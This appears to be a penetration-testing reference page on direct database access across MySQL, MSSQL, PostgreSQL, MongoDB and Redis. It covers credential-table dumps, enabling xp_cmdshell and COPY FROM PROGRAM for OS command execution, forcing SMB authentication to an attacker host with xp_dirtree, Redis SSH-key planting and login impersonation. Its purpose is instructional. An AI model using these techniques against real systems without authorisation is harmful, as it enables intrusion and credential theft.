# Direct database access

[Home](../README.md) · [SQL injection](../02-Web/SQL-Injection.md) · [File attacks](../02-Web/File-Attacks.md)

Database commands run inside the named client unless a block says Bash. First identify the server, current database, login and effective privileges. A database administrator is not automatically the operating-system administrator.

## MySQL and MariaDB — TCP 3306

**Kali / Bash:**

```bash
mysql -h <IP> -P 3306 -u <USER> -p
mysql -h <IP> -u <USER> -p < commands.sql
```

**MySQL console:**

```sql
SELECT version(), user(), current_user(), database();
SHOW DATABASES;
USE app;
SHOW TABLES;
DESCRIBE users;
SELECT username,password FROM users;
SHOW GRANTS;
SELECT user,host,authentication_string FROM mysql.user;
SELECT @@secure_file_priv;
SELECT LOAD_FILE('/var/lib/mysql-files/example.txt');
```

`\G` prints a result vertically; it replaces the usual terminator. Read only tables needed for the lead. Access to `mysql.user` and file operations requires privileges. `LOAD_FILE` also depends on server OS permissions and configuration.

`SELECT ... INTO OUTFILE '/path/file'` writes on the **database server**, normally requires `FILE`, is constrained by `secure_file_priv` and does not overwrite an existing file. OS execution through a web file additionally requires a writable web path and a server-side execution handler. Writing an SSH public key similarly requires the right account path, permissions and SSH policy.

The MySQL client's `\! sh` starts a shell on the **client machine**, under the client user's identity. It is not remote command execution on the database host.

Historical notes show direct password updates in `mysql.user`; authentication schemas and functions vary by version. Application password updates also depend on the application's actual hash format. Preserve the original record before any deliberate modification. A stored shell-looking string is data unless a separate vulnerable process executes it.

## Microsoft SQL Server — TCP 1433

**Kali / Bash:**

```bash
impacket-mssqlclient '<DOMAIN>/<USER>@<IP>' -windows-auth
sqsh -S <IP> -U <USER>
```

Omit `-windows-auth` for a SQL-authentication login. `sqlcmd -S <IP> -U <USER>` is another client. Some clients require `GO` on its own line; others execute a statement immediately.

**T-SQL:**

```sql
SELECT @@version;
SELECT SYSTEM_USER, ORIGINAL_LOGIN(), USER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT name FROM sys.databases;
SELECT TABLE_SCHEMA,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
SELECT name,is_linked FROM sys.servers;
SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT SYSTEM_USER');
EXEC ('SELECT SYSTEM_USER') AT [LINKED_SERVER];
```

Linked-server access depends on mappings, remote privileges and enabled features. `EXEC ... AT` may require RPC Out; discovering a link does not prove the ability to change its configuration. Follow links while recording the effective identity at each hop. The source binary-extraction example reads `sys.assembly_files` through a linked query and uses `FOR XML PATH(''), BINARY BASE64` to serialize binary content.

### OS execution with xp_cmdshell

Requires the permission to invoke it and, if disabled, sufficient permission to enable it. Record initial settings:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

Execution uses the SQL Server service account for a sysadmin caller, or a configured proxy for eligible non-sysadmin callers. Confirm the returned identity. `enable_xp_cmdshell` is an Impacket client helper, not a T-SQL statement. Other source procedure names include `xp_logininfo`, `xp_enumgroups`, `xp_msver` and logging/login administration procedures; permissions and availability differ.

`xp_dirtree '\\<LHOST>\share'` can trigger outbound SMB authentication from the SQL host. Reaching a listener, capturing a challenge-response and relaying authentication are separate conditions. `OPENROWSET` file reads depend on bulk permissions, provider configuration and OS access.

## PostgreSQL — TCP 5432

**Kali / Bash:**

```bash
psql -h <IP> -p 5432 -U <USER> -d <DATABASE> -W
```

**psql console:**

```text
\list
\c <DATABASE>
\dt
\du
SELECT version(),current_user;
SELECT * FROM users;
\q
```

Server-side file reads/writes and `COPY ... PROGRAM` are privileged features. If the account has the necessary server role, an example execution proof is:

```sql
CREATE TEMP TABLE command_output(line text);
COPY command_output FROM PROGRAM 'id';
SELECT * FROM command_output;
```

This executes on the server under its OS service account. Client-side `\!` or `\copy` behavior is different.

## MongoDB — TCP 27017

Use the installed Mongo shell (`mongosh` or legacy `mongo`) to connect to `mongodb://<IP>:27017`. The following are shell commands:

```javascript
show dbs
use app
show collections
db.users.find().limit(10)
db.users.countDocuments({})
db.getUsers()
```

Query application users and configuration only where accessible. `db.getUsers({showCredentials:true})` is privileged and does not guarantee plaintext passwords. A direct `updateOne` can modify a record if permitted, but a valid replacement password depends on the application's field layout and hashing. Avoid copying a machine-specific bcrypt or SHA value from another example.

## Redis — TCP 6379

**Kali:** `redis-cli -h <IP>`. **Redis console:**

```text
AUTH <PASSWORD>
INFO SERVER
INFO keyspace
CONFIG GET dir
CONFIG GET dbfilename
SCAN 0
GET <KEY>
```

ACL-enabled installations may require `AUTH <USER> <PASSWORD>`. Prefer incremental `SCAN` to `KEYS *` on a large database. A serialized session value can sometimes be modified, but its structure and length fields must match the application and the account must have write access.

Historical SSH-key placement changes `dir`/`dbfilename`, stores a public key and saves an RDB file into a writable `.ssh` path. It needs configuration permission, filesystem access, a usable output format and SSH acceptance; it is not a general Redis feature for logging in. Save and restore original settings. `FLUSHALL` deletes the database and is unnecessary for this technique; it has been removed from the consolidated workflow.

## SQLite and Oracle

SQLite is normally a file rather than a network service. Open a recovered copy with `sqlite3 <DATABASE>.db`, then use `.tables`, `.schema` and relevant `SELECT` queries. Oracle TNS appears in the source port list at 1521–1529; the supplied SQL-injection examples use `all_tables` and `all_tab_columns` for schema discovery. Keep database-specific syntax with the [SQL-injection reference](../02-Web/SQL-Injection.md).

## Additional data types and identity contexts

PostgreSQL `pg_shadow` exposes restricted password metadata; `pg_read_file`, `pg_ls_dir` and server-file roles require the corresponding server-side rights. They are not ordinary file access for every SQL user.

SQLite `PRAGMA table_info(<TABLE>);` describes columns. Redis hash values use `HGET`, `HGETALL`, `HKEYS` or `HVALS`, not ordinary `GET`; inspect `TYPE <KEY>` first.

MSSQL Impacket helpers `enum_logins`/`enum_impersonate` identify candidates. `EXECUTE AS LOGIN = '<LOGIN>';` and `EXECUTE AS USER = '<USER>';` require effective impersonation permission and have different server/database scopes. Inspect `SYSTEM_USER` and `USER_NAME()` afterward; `REVERT;` returns to the previous context. Record a linked server's identity again at every hop.
